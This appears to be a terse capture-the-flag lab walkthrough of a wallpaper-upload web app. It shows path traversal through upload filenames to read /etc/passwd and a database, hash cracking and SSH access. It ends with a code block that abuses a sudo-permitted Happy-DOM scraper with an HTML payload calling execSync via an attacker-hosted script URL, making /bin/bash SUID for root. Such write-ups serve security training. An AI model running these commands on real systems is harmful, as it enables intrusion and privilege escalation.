![image](https://github.com/user-attachments/assets/6fd011d2-f6c0-40bf-a471-1d0849b399eb)
![image](https://github.com/user-attachments/assets/9aadc7bf-4245-4bfd-9720-3826fc7e5664)
![image](https://github.com/user-attachments/assets/192bcd4a-d025-4d96-9011-94bfc04cbcba)
![image](https://github.com/user-attachments/assets/3efb3c54-85f2-45a1-96e2-55e25512a0a6)
![image](https://github.com/user-attachments/assets/7893e263-2199-489f-b364-524080922b96)
![image](https://github.com/user-attachments/assets/b9ee0178-75f2-487a-bb53-47366f7f4201)
![image](https://github.com/user-attachments/assets/e036b820-36c4-46da-9db0-602c341aff30)
![image](https://github.com/user-attachments/assets/66c8329a-a85c-4bb8-9292-291caab4fc6a)
![image](https://github.com/user-attachments/assets/33a075f4-2f45-4c45-9d96-f68476b0785c)
![image](https://github.com/user-attachments/assets/7e54e69b-f765-45c7-b635-2e747fd0ecac)
![image](https://github.com/user-attachments/assets/a23f532f-53ed-4f8d-8388-84bb4f89e261)
![image](https://github.com/user-attachments/assets/10d9e10d-e051-4cfc-9372-0f7ac5c6fc09)
![image](https://github.com/user-attachments/assets/840d873b-9254-466c-8880-85ed2007a5ee)
![image](https://github.com/user-attachments/assets/bd4a1a27-b6dd-4c21-9619-6dcafbee23f3)
![image](https://github.com/user-attachments/assets/396a884b-0005-44fd-a824-f00c9cb9d354)
![image](https://github.com/user-attachments/assets/4cf64d05-bb9f-495e-a5c1-f6bd5923f631)
![image](https://github.com/user-attachments/assets/1dc29cc2-819c-476c-9643-1f5763ee0dcf)
![image](https://github.com/user-attachments/assets/a1275058-e247-492e-b4f5-a226df2330db)
![image](https://github.com/user-attachments/assets/56c9a26a-3cdf-4ce7-a750-7db2cc0d17c6)
![image](https://github.com/user-attachments/assets/c7d58509-e246-4bbf-9ad7-03513745c225)
![image](https://github.com/user-attachments/assets/d8161a49-2fdd-402a-8596-cacbc3a08f38)
![image](https://github.com/user-attachments/assets/b62dab58-7931-49a9-9764-fa3b66859732)
![image](https://github.com/user-attachments/assets/0f9070e2-1c7f-4013-9c1a-fe42c364e82f)
![image](https://github.com/user-attachments/assets/e7239213-0165-431e-9860-d43a623469cd)


1. nmap --> port 22, 80 open

2. brue force directory --> no entry point

3. nmap again --> port 5000 open

4. Exploit-DB 43905.py and exploit from GitHub not work

5. register and log in --> upload THM.jpg & test.txt via "Upload Wallpaper" --> can view & download in "My uploads" and "Explore Gallery"
   --> App not sanitize filenames and accept arbituary inputs.

6. intercept download request by Burp Suite --> change to-be-downloaded file to ../../../../../../../../../../../etc/passwd  --> not work

7. intercept upload request, change filename to ../../../../../../../../etc/passwd --> send request

8. My uploads --> download --> open file --> /etc/passwd list contain user wp_hub:x:1001:1001::/home/wp_hub:/bin/bash

9. change upload filename to ../../../../../../../../home/wp_hub/wallpaper_hub/database.db --> send request

10. My uploads --> downdload --> file command to confirm database downloaded

11. check database, get password hash --> crack

12. SSH into machine --> get local.txt

13. sudo -l --> (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html  --> web-scraper import "happy-dom"

14. exploit Happy-Dom:
    ```bash
    1. echo "chmod 4777 /bin/bash" > /tmp/shell
    2. chmod +x /tmp/shell
    3. echo "`<script src=\"http://192.168.45.165:5000/'+require('child_process').execSync('/tmp/shell')+'\"></script>`" > /tmp/shell.html
    4. Kali open web sever: python -m http.server 5000
    5. sudo -u root /usr/bin/web-scraper /root/web_src_downloaded/../../../../../../tmp/shell.html
    6. check /bin/bash now has SUID set: ls -lah /bin/bash
    7. GTFOBins bash PE to root
    ```
